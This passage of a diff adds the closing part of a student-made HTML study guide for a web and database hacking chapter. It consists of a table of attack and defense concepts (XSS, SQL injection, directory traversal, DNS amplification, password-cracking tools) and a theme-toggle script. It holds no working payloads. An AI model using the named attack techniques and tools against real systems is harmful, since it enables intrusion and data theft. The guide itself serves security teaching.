+            <tr>
+              <th>Topic</th>
+              <th>Key Point</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Web Server</td>
+              <td>Stores, processes, delivers web pages over HTTP; client-server model with browser as client</td>
+            </tr>
+            <tr>
+              <td>Why Web Servers Are Targeted</td>
+              <td>Network defenses handle network-level attacks, pushing attackers to the web layer; web servers are
+                publicly reachable by design</td>
+            </tr>
+            <tr>
+              <td>Goals of Web Server Hacking</td>
+              <td>Steal credit cards/creds, build a botnet, compromise a database, steal closed-source apps, hide
+                traffic, escalate privileges, or purely for curiosity/challenge/reputation damage</td>
+            </tr>
+            <tr>
+              <td>Dangerous Oversights</td>
+              <td>No patching, reused sysadmin credentials, unrestricted traffic, unhardened apps/servers</td>
+            </tr>
+            <tr>
+              <td>4 Perspectives</td>
+              <td>Webmaster (exposed internals), Network Admin (misconfiguration), End User (assumes safety), Key
+                Principle (poor config bypasses firewalls)</td>
+            </tr>
+            <tr>
+              <td>Root Causes</td>
+              <td>Unpatched software, poor config, vulnerable apps, weak auth, human error</td>
+            </tr>
+            <tr>
+              <td>Impact of Compromise</td>
+              <td>Data theft/tampering, defacement, malware distribution, privilege escalation, secondary attacks</td>
+            </tr>
+            <tr>
+              <td>8 Web Server Vulnerabilities</td>
+              <td>Buffer overflow, DoS/DDoS, banner info, permissions, error messages, unnecessary features, user
+                accounts, SQL injection</td>
+            </tr>
+            <tr>
+              <td>DNS Server Hijacking</td>
+              <td>Attacker compromises DNS server, redirects mappings to a rogue DNS server / fake site</td>
+            </tr>
+            <tr>
+              <td>DNS Amplification Attack</td>
+              <td>Small spoofed queries to open resolvers trigger large responses flooding the victim (DDoS)</td>
+            </tr>
+            <tr>
+              <td>Directory Traversal</td>
+              <td>Uses path sequences like ../../ to escape the web root and read arbitrary files</td>
+            </tr>
+            <tr>
+              <td>MITM / Sniffing</td>
+              <td>Intercepts or reads traffic in transit between client and server</td>
+            </tr>
+            <tr>
+              <td>Web Cache Poisoning</td>
+              <td>Flushes real cache content, stores infected content instead; requires HTTP Response-Splitting flaw
+              </td>
+            </tr>
+            <tr>
+              <td>Session Hijacking with Cookies</td>
+              <td>Steals/replays a valid session cookie to impersonate the user</td>
+            </tr>
+            <tr>
+              <td>Banner Information</td>
+              <td>Connect to port 80 (HTTP) to read the web server's banner and identify software/version</td>
+            </tr>
+            <tr>
+              <td>Permissions</td>
+              <td>Control server/content access; incorrectly assigned permissions expose restricted locations</td>
+            </tr>
+            <tr>
+              <td>Unnecessary Features</td>
+              <td>Servers should be purpose-built; hardening removes anything not essential; disable/uninstall unused
+                features</td>
+            </tr>
+            <tr>
+              <td>User Accounts</td>
+              <td>Default OS accounts are discoverable; disable/remove defaults, create purpose-matched accounts</td>
+            </tr>
+            <tr>
+              <td>4 Web Application Attacks</td>
+              <td>Cookie tampering, unvalidated input/file injection, XSS, SQL injection</td>
+            </tr>
+            <tr>
+              <td>Cookie Tampering</td>
+              <td>Modifying persistent/non-persistent cookies in transit from client to server</td>
+            </tr>
+            <tr>
+              <td>XSS (Definition)</td>
+              <td>Injection of malicious (often browser-side) script into a trusted site, delivered to another user</td>
+            </tr>
+            <tr>
+              <td>XSS Types (enrichment)</td>
+              <td>Reflected (bounces back once), Stored (persists, hits all viewers), DOM-based (client-side JS only)
+              </td>
+            </tr>
+            <tr>
+              <td>SQL Injection (Definition)</td>
+              <td>Malicious code injected into strings later passed to the SQL server for execution</td>
+            </tr>
+            <tr>
+              <td>SQLi Categories (enrichment)</td>
+              <td>In-band (error-based, union-based); Blind (boolean-based, time-based)</td>
+            </tr>
+            <tr>
+              <td>SQLi Tools (enrichment)</td>
+              <td>sqlmap (automated exploitation), Burp Suite (intercepting proxy for manual testing)</td>
+            </tr>
+            <tr>
+              <td>SQLi Defense</td>
+              <td>Parameterized queries/prepared statements, input validation, least-privilege DB accounts</td>
+            </tr>
+            <tr>
+              <td>Session (Definition)</td>
+              <td>A client-server connection with a unique identifier, encryption, and other parameters</td>
+            </tr>
+            <tr>
+              <td>Session Vulnerabilities</td>
+              <td>Long-lived sessions, missing logout, weak session IDs, IDs to unauthorized users, weak password
+                change controls, unprotected cookie data</td>
+            </tr>
+            <tr>
+              <td>Encryption Weaknesses</td>
+              <td>Weak ciphers (short/poor keys) vs. vulnerable software implementations (e.g. poorly programmed SSL)
+              </td>
+            </tr>
+            <tr>
+              <td>Database Vulnerabilities</td>
+              <td>Weak/default/shared passwords, excessive privileges, unpatched software, insecure/default config,
+                no RBAC, open ports, poor backups, weak logging/monitoring, human error</td>
+            </tr>
+            <tr>
+              <td>10 Database Attacks</td>
+              <td>SQL injection, credential brute-force, privilege escalation, unauthorized data access, data
+                manipulation, abuse of stored procedures, exploiting misconfigured permissions, password cracking,
+                bypassing authentication, insider attacks</td>
+            </tr>
+            <tr>
+              <td>Impact of Database Attacks</td>
+              <td>Data theft → tampering/deletion → loss of confidentiality/integrity → service disruption → legal/
+                reputational damage</td>
+            </tr>
+            <tr>
+              <td>Database-Locating Tools</td>
+              <td>Network Database Scanner (rogue DBs), SQLRecon (Microsoft SQL), Oscanner (Oracle)</td>
+            </tr>
+            <tr>
+              <td>Database Password Cracking</td>
+              <td>SQLPing3, Cain and Abel; both use dictionary-based cracking methods</td>
+            </tr>
+            <tr>
+              <td>Locating DB Vulnerabilities</td>
+              <td>Misused stored procedures, service account privilege issues, weak auth methods, no/limited audit
+                logs</td>
+            </tr>
+            <tr>
+              <td>Database Defense ("Out of Sight, Out of Mind")</td>
+              <td>Learn security features, evaluate nonstandard ports, keep up to date, secure the OS, use a firewall
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+  </main>
+
+  <footer>
+    <div class="footer-name">Made by Shoug Alomran</div>
+    <div class="footer-sub">CYS405 · Chapter 8: Web and Database Hacking · Study Guide</div>
+  </footer>
+
+  <script>
+    // Auto-detect system preference on load
+    (function () {
+      const _stored = localStorage.getItem('shoug-theme');
+      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+      const theme = _stored === 'dark' ? 'dark' : _stored === 'light' ? 'light' : (prefersDark ? 'dark' : 'light');
+      document.documentElement.setAttribute('data-theme', theme);
+      updateToggle(theme);
+    })();
+
+    // Listen for system changes
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+      if (localStorage.getItem('shoug-theme')) return;
+      const theme = e.matches ? 'dark' : 'light';
+      document.documentElement.setAttribute('data-theme', theme);
+      updateToggle(theme);
+    });
+
+    function toggleTheme() {
+      const current = document.documentElement.getAttribute('data-theme');
+      const next = current === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', next);
+      try { localStorage.setItem('shoug-theme', document.documentElement.getAttribute('data-theme')); } catch (e) { }
+      updateToggle(next);
+    }
+
+    function updateToggle(theme) {
+      const icon = document.getElementById('toggle-icon');
+      const label = document.getElementById('toggle-label');
+      if (theme === 'dark') {
+        icon.textContent = '☀️';
+        label.textContent = 'Light Mode';
+      } else {
+        icon.textContent = '🌙';
+        label.textContent = 'Dark Mode';
+      }
+    }
+  </script>
+
+</body>
+
+</html>
